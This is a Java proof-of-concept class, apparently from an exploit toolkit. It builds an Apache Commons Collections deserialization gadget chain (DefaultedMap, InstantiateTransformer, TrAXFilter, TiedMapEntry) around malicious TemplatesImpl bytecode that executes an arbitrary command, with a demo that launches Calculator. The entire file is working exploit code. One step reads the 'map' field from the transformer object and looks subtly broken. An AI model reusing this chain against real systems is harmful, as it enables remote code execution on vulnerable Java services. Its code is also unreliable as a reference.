package xyz.eki.marshalexp.poc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;


public class MCC6 implements POC{

    public Object getPocObject(Object poc) throws Exception{
        HashMap innermap = new HashMap();
        InstantiateTransformer exp =  new InstantiateTransformer(new Class[]{Templates.class},new Object[]{poc});

        DefaultedMap map = (DefaultedMap) DefaultedMap.decorate(innermap,exp);

        TiedMapEntry tiedmap = new TiedMapEntry(map, TrAXFilter.class);

        HashSet hashset = new HashSet(1);
        hashset.add("foo");

        HashMap hashset_map = (HashMap) ReflectUtils.getFieldValue(exp,"map");
        Object[] array = (Object[]) ReflectUtils.getFieldValue(hashset_map,"table");

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tiedmap);

        return hashset;
    }


    @Override
    public Object getPocObject(byte[] bytes) throws Exception {
        return getPocObject(GTemplates.getEvilTemplates(bytes));
    }


    @Override
    public Object getPocObject(String cmd) throws Exception {
        return getPocObject(GTemplates.getEvilTemplates(cmd));
    }


    public static void main(String[] args) throws Exception {
        String cmd= "open /System/Applications/Calculator.app";
        Object poc = new MCC6().getPocObject(cmd);
        SerializeUtils.deserialize(SerializeUtils.serialize(poc));
    }
}
